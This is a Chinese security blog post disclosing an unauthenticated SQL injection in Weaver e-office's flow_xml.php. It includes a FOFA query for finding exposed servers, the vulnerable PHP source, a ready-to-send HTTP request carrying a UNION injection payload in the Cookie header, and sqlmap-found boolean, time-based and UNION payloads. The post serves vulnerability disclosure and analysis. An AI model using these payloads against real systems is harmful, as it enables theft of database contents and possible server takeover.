---
title: "泛微e-office flow_xml.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-system-workflow-flow_type-flow_xml-SORT_ID-sqli.html
asset_dir: assets/泛微e-office-flow_xml.php-sql注入漏洞
---

# 泛微e-office flow\_xml.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/10 18:30
- 1002浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

服务器安全服务

安全认证考试

漏洞扫描服务

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office flow\_xml.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

直接看 flow\_xml.php 文件业务逻辑实现

深入探索

编码转换工具

Windows安全工具

数据库

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/xtree_xml.inc.php" );
include_once( "api/system_Workflow.class.php" );
( "Expires: Mon, 26 Jul 1997 05:00:00 GMT" );
( "Cache-Control: no-cache, must-revalidate" );
( "Pragma: no-cache" );
( "Content-Type: text/xml" );
$xtreeXml = new xtreeXml( );
$xtreeXml->initXml( );
$workFlowDefine = new workFlowDefine( );
$flow_info = $workFlowDefine->getFlowInfo( "FLOW_NOORDER", "ASC", "FLOW_SORT=".$_REQUEST['SORT_ID'] );
while ( list( $key, $val ) = ( $flow_info ) )
{
    $src = "";
    $FLOW_ID = $val['FLOW_ID'];
    $run_id = 0;
    $sql = "SELECT RUN_ID FROM flow_run WHERE CURRENT_STEP > 0 AND FLOW_ID = '".$FLOW_ID."'";
    $rs = ( $connection, $sql );
    if ( $rows = ( $rs ) )
    {
        $run_id = $rows['RUN_ID'];
    }
    $action = "javascript:flow_point('".$FLOW_ID."','".$run_id."');";
    $target = "flow".__FILE__;
    $xtreeXml->creatItem( $val['FLOW_NAME'], $action, $src, $target, $icon );
}
$xtreeXml->endXml( );
?>
```

`SORT_ID` 直接带入 `getFlowInfo` 函数，业务逻辑如下

漏洞扫描服务

```
public function getFlowInfo( $field = "", $norder = "", $WHERE = "" )
    {
        global $connection;
        $orderby = $this->set_orderby( $field, $norder );
        if ( $WHERE )
        {
            $condition = $WHERE;
        }
        else
        {
            $condition = " FLOW_ID=".$this->FLOW_ID;
        }
        $query = "SELECT * from FLOW_TYPE where ".$condition.$orderby;
        $cursor = ( $connection, $query );
```

深入探索

文本剥离工具

安全

安全研究报告

`SORT_ID` 是直接拼接进SQL语句中执行，无任何过滤，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

`SORT_ID` 通过 `$_REQUEST['SORT_ID']` 获取，`$_REQUEST` 在 PHP 里属于一个包含了 `GET` 、`POST` 和 `COOKIE` 方法传递参数的超全局数组，因此在测试时可使用 `Cookie` 传递 `SORT_ID` 值进入SQL语句中。

物流软件安全

# 漏洞复现

```
GET /general/system/workflow/flow_type/flow_xml.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: SORT_ID=1 UNION ALL SELECT NULL,CONCAT(0x716b717071,0x4a7472506b73516e4a5366674b796e4c4e75754c715a7a78774573635968615853586a586d554a62,0x7178787671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

[![泛微e-office flow_xml.php sql注入漏洞](images/img-001-0f4c998e89f1.webp)](https://image.mrxn.net/6227c8d81b7a462e9a41b06b2b24f9f3.webp)

通过联合注入 成功在响应回显了测试payload。

网络安全

通过 [sqlmap](https://mrxn.net/tag/sqlmap) 还可测试出其他注入方式如下

```
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: SORT_ID (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: SORT_ID=11 OR NOT 3433=3433#

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: SORT_ID=11 OR (SELECT 7163 FROM (SELECT(SLEEP(5)))Uump)-- TPpo

    Type: UNION query
    Title: Generic UNION query (NULL) - 16 columns
    Payload: SORT_ID=11 UNION ALL SELECT NULL,CONCAT(0x716b717071,0x4a7472506b73516e4a5366674b796e4c4e75754c715a7a78774573635968615853586a586d554a62,0x7178787671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
